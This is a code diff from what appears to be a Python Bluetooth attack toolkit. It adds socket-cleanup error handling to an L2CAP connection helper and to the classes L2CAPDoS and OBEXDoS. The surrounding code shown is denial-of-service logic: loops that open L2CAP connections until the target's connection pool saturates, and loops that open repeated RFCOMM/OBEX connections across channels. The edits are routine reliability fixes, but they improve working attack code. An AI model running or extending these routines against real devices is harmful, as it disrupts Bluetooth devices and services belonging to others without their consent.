@@ -93,7 +93,14 @@ def _l2cap_connect(target: str, psm: int,
     """Connect an L2CAP socket to target on given PSM."""
     sock = _l2cap_raw_socket(hci)
     sock.settimeout(10)
-    sock.connect((target, psm))
+    try:
+        sock.connect((target, psm))
+    except OSError:
+        try:
+            sock.close()
+        except OSError:
+            pass
+        raise
     return sock
 
 
@@ -249,6 +256,7 @@ class L2CAPDoS:
         connected = 0
 
         for i in range(count):
+            sock = None
             try:
                 sock = _l2cap_raw_socket(self.hci)
                 sock.settimeout(5)
@@ -256,6 +264,11 @@ class L2CAPDoS:
                 sockets.append(sock)
                 connected += 1
             except OSError:
+                if sock is not None:
+                    try:
+                        sock.close()
+                    except OSError:
+                        pass
                 info(f"  Connection pool saturated at {connected} connections")
                 break
 
@@ -1166,6 +1179,7 @@ class OBEXDoS:
         try:
             for i in range(min(count, len(channels) * 3)):
                 channel = channels[i % len(channels)]
+                sock = None
                 try:
                     sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM,
                                          BTPROTO_RFCOMM)
@@ -1186,6 +1200,11 @@ class OBEXDoS:
                         pass
 
                 except OSError as exc:
+                    if sock is not None:
+                        try:
+                            sock.close()
+                        except OSError:
+                            pass
                     warning(f"Channel {channel} connection {i} failed: {exc}")
                     continue
 
@@ -1228,14 +1247,20 @@ class OBEXDoS:
         try:
             # Try to connect to first available OBEX channel
             for channel in channels:
+                candidate = None
                 try:
-                    sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM,
-                                         BTPROTO_RFCOMM)
-                    sock.settimeout(10)
-                    sock.connect((self.target, channel))
+                    candidate = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM,
+                                              BTPROTO_RFCOMM)
+                    candidate.settimeout(10)
+                    candidate.connect((self.target, channel))
+                    sock = candidate
                     break
                 except OSError:
-                    sock = None
+                    if candidate is not None:
+                        try:
+                            candidate.close()
+                        except OSError:
+                            pass
                     continue
 
             if sock is None:
